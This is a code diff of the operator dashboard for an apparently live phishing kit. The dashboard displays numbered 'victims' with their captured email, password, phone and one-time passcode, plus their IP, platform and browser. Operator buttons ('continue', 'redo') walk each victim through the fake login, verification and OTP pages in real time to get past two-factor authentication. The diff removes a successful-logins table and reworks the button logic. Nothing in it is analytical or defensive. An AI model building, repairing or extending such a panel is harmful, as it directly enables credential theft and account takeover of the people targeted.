@@ -34,18 +34,11 @@
     .icon-btn.continue{border-color:rgba(52,211,153,.3)}.icon-btn.continue:hover{background:rgba(52,211,153,.15)}
     .icon-btn.redo{border-color:rgba(251,113,133,.3)}.icon-btn.redo:hover{background:rgba(251,113,133,.15)}
     .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)}
-    .icon-btn.delete{border-color:rgba(251,113,133,.3)}.icon-btn.delete:hover{background:rgba(251,113,133,.15)}
     .cred{font-family:monospace;font-size:.8rem;background:#f1f1f1;padding:2px 4px;border-radius:3px;color:#000}
     .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
     #modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(5px)}#modal .card{max-width:600px;width:90%;background:#111;border-color:#333;max-height:90vh;overflow-y:auto;padding:28px}
     #empty{text-align:center;color:#888;padding:2rem 0}
     @media(max-width:900px){.stats{grid-template-columns:1fr}}
-
-    /* Approved Sessions Table Styles */
-    .approved-table th{border-bottom-color:rgba(52,211,153,.3);color:var(--green)}
-    .approved-row{background:rgba(52,211,153,.03)}
-    .approved-row:hover{background:rgba(52,211,153,.08)}
-    .approved-badge{display:inline-block;background:rgba(52,211,153,.15);color:var(--green);padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.05em}
 
     /* Clean Modal Styles */
     .modal-header{border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:16px;margin-bottom:20px}
@@ -113,25 +106,12 @@
       </div>
     </div>
 
-    <!-- Active Sessions Table -->
     <div class="card" style="margin-top:22px">
       <div style="font-size:14px;font-weight:600;margin-bottom:12px">Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:#60a5fa;text-decoration:none"></a></div>
       <table id="tbl"><thead><tr>
         <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
       </tr></thead><tbody></tbody></table>
       <div id="empty">No active sessions</div>
-    </div>
-
-    <!-- Successful Logins Table -->
-    <div class="card" style="margin-top:22px;border-color:rgba(52,211,153,.2)">
-      <div style="font-size:14px;font-weight:600;margin-bottom:12px;display:flex;align-items:center;gap:8px">
-        <span style="color:var(--green)">✓</span> Successful Logins
-        <span class="approved-badge" id="approvedCount">0</span>
-      </div>
-      <table id="approvedTbl" class="approved-table"><thead><tr>
-        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Approved At</th><th>Actions</th>
-      </tr></thead><tbody></tbody></table>
-      <div id="approvedEmpty" style="text-align:center;color:#888;padding:2rem 0">No successful logins yet</div>
     </div>
   </div>
 
@@ -186,7 +166,7 @@
 
     /* ----------  STATUS TEXT  ---------- */
     function statusText(s){
-      if (s.page==='success' || s.status==='approved') return '<div style="color:var(--green)">APPROVED</div>';
+      if (s.page==='success') return '<div style="color:var(--green)">APPROVED</div>';
       if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
       if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
       if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
@@ -194,46 +174,46 @@
       return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
-    /* ----------  ACTION BUTTONS (table row)  ---------- */
-    function actionButtons(s, isApproved = false){
+    /* ----------  ACTION BUTTONS (table row) - FIXED LOGIC  ---------- */
+    function actionButtons(s){
       let html = '<div style="display:flex;gap:6px">';
       
       // Always show view details
-      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}', ${isApproved})" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
 
-      if (!isApproved) {
-        // Show redo/continue based on page AND data entered for active sessions
-        if (s.page === 'index.html') {
-          if (s.entered === true || (s.email && s.password)) {
-            html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-            html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-          }
-        } else if (s.page === 'verify.html') {
-          if (s.phone && s.phone.length > 0) {
-            html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-            html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-          }
-        } else if (s.page === 'unregister.html') {
-          if (s.unregisterClicked === true) {
-            html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-          }
-        } else if (s.page === 'otp.html') {
-          if (s.otp && s.otp.length > 0) {
-            html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-            html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-          }
+      // Show redo/continue based on page AND data entered - FIXED CONDITIONS
+      if (s.page === 'index.html') {
+        // On login page: show buttons if credentials entered (check both entered flag and email/password values)
+        if (s.entered === true || (s.email && s.password)) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
-      } else {
-        // Approved sessions only get delete button
-        html += `<button class="icon-btn delete" onclick="confirmDelete('${s.sid}')" title="Delete"><img src="/images/trash-svgrepo-com.svg" style="filter:brightness(0) invert(1) sepia(1) saturate(5) hue-rotate(320deg)"></button>`;
+      } else if (s.page === 'verify.html') {
+        // On verify page: show buttons if phone entered
+        if (s.phone && s.phone.length > 0) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+        }
+      } else if (s.page === 'unregister.html') {
+        // On unregister page: show continue if clicked, no redo
+        if (s.unregisterClicked === true) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        }
+      } else if (s.page === 'otp.html') {
+        // On OTP page: show buttons if OTP entered
+        if (s.otp && s.otp.length > 0) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+        }
       }
+      // Note: success page has no buttons (already approved)
       
       return html + '</div>';
     }
 
-    /* ----------  CHANGE DETECTION  ---------- */
-    function checkChanges(newSessions, newApproved){
-      // Check for new data entry in active sessions
+    /* ----------  CHANGE DETECTION - REMOVED TAB CLOSE DETECTION  ---------- */
+    function checkChanges(newSessions){
+      // Only check for new data entry, not session removal
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
         if (!old) {
@@ -247,20 +227,7 @@
           if (old.page !== s.page) showAlert('info', 'PAGE CHANGE', `Moved to ${pageTitle(s.page)}`, s.victimNum);
         }
       });
-      
-      // Check for newly approved sessions
-      newApproved.forEach(s => {
-        const old = lastSessions.get(s.sid);
-        if (old && old.status !== 'approved') {
-          showAlert('success', 'LOGIN APPROVED', `Victim #${s.victimNum} completed flow`, s.victimNum);
-        }
-      });
-      
-      // Update last sessions tracking (both active and approved)
-      const allSessions = new Map();
-      newSessions.forEach(s => allSessions.set(s.sid, {...s}));
-      newApproved.forEach(s => allSessions.set(s.sid, {...s}));
-      lastSessions = allSessions;
+      lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
     }
 
     /* ----------  RENDER  ---------- */
@@ -274,7 +241,6 @@
         default: return f;
       }
     }
-    
     function render(d){
       qs('#userName').textContent = d.username;
       qs('#active').textContent   = d.active;
@@ -282,62 +248,35 @@
       qs('#success').textContent  = d.success;
       qs('#domainLink').textContent = d.domain || 'localhost';
       qs('#domainLink').href        = d.domain || 'http://localhost';
-      qs('#approvedCount').textContent = d.approvedSessions.length;
 
-      // Render Active Sessions
       const body = qs('#tbl tbody');
       const empty= qs('#empty');
-      if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; }
-      else {
-        empty.style.display='none';
-        body.innerHTML = d.sessions.map(s=>`
-          <tr data-sid="${s.sid}">
-            <td>${s.victimNum}</td>
-            <td><span class="cred">${s.email||'—'}</span></td>
-            <td><span class="cred">${s.password||'—'}</span></td>
-            <td><span class="cred">${s.phone||'—'}</span></td>
-            <td><span class="cred">${s.otp||'—'}</span></td>
-            <td>${s.ip}</td>
-            <td>${s.platform}</td>
-            <td>${s.browser}</td>
-            <td><div style="font-weight:600">${pageTitle(s.page)}</div>${statusText(s)}</td>
-            <td>${actionButtons(s, false)}</td>
-          </tr>`).join('');
-      }
-
-      // Render Approved Sessions
-      const approvedBody = qs('#approvedTbl tbody');
-      const approvedEmpty = qs('#approvedEmpty');
-      if(!d.approvedSessions.length){ approvedBody.innerHTML=''; approvedEmpty.style.display='block'; }
-      else {
-        approvedEmpty.style.display='none';
-        approvedBody.innerHTML = d.approvedSessions.map(s=>`
-          <tr data-sid="${s.sid}" class="approved-row">
-            <td>${s.victimNum}</td>
-            <td><span class="cred">${s.email||'—'}</span></td>
-            <td><span class="cred">${s.password||'—'}</span></td>
-            <td><span class="cred">${s.phone||'—'}</span></td>
-            <td><span class="cred">${s.otp||'—'}</span></td>
-            <td>${s.ip}</td>
-            <td>${s.platform}</td>
-            <td>${s.browser}</td>
-            <td><span class="approved-badge">${fmt(s.approvedAt)}</span></td>
-            <td>${actionButtons(s, true)}</td>
-          </tr>`).join('');
-      }
+      if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
+      empty.style.display='none';
+      body.innerHTML = d.sessions.map(s=>`
+        <tr data-sid="${s.sid}">
+          <td>${s.victimNum}</td>
+          <td><span class="cred">${s.email||'—'}</span></td>
+          <td><span class="cred">${s.password||'—'}</span></td>
+          <td><span class="cred">${s.phone||'—'}</span></td>
+          <td><span class="cred">${s.otp||'—'}</span></td>
+          <td>${s.ip}</td>
+          <td>${s.platform}</td>
+          <td>${s.browser}</td>
+          <td><div style="font-weight:600">${pageTitle(s.page)}</div>${statusText(s)}</td>
+          <td>${actionButtons(s)}</td>
+        </tr>`).join('');
     }
 
     /* ----------  MODAL / DETAIL VIEW  ---------- */
-    function showDetail(sid, isApproved = false){
-      const s = isApproved ? 
-        jsonData.approvedSessions.find(x=>x.sid===sid) : 
-        jsonData.sessions.find(x=>x.sid===sid);
+    function showDetail(sid){
+      const s = jsonData.sessions.find(x=>x.sid===sid);
       if(!s)return;
       currentSid = sid;
       
       // Update header
-      qs('#modalTitle').textContent = `Victim #${s.victimNum} ${isApproved ? '✓ APPROVED' : ''}`;
-      qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}${s.approvedAt ? ' • Approved ' + fmtDate(s.approvedAt) : ''}`;
+      qs('#modalTitle').textContent = `Victim #${s.victimNum}`;
+      qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
       
       // Build activity log HTML
       const activityHtml = s.activityLog && s.activityLog.length ? 
@@ -359,8 +298,8 @@
           </div>
           
           <div class="info-section">
-            <div class="info-label">Status</div>
-            <div class="info-value" style="color:${isApproved?'var(--green)':'var(--blue)'};text-transform:uppercase;letter-spacing:0.05em">${isApproved?'Approved':'Active'}</div>
+            <div class="info-label">Current Page</div>
+            <div class="info-value" style="color:${s.page==='success'?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}</div>
           </div>
           
           <div class="info-section">
@@ -412,7 +351,7 @@
         </div>
         
         <div class="delete-section">
-          <div class="delete-info">Permanently remove this session${isApproved ? ' from successful logins' : ' from active sessions'}</div>
+          <div class="delete-info">Permanently remove this session from active sessions</div>
           <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
         </div>
       `;
@@ -450,7 +389,7 @@
       const d = await fetch('/api/panel').then(r=>r.json());
       if(d.error)return location.replace('/panel');
       jsonData = d;
-      checkChanges(d.sessions, d.approvedSessions);
+      checkChanges(d.sessions);
       render(d);
       setTimeout(load,300);
     }
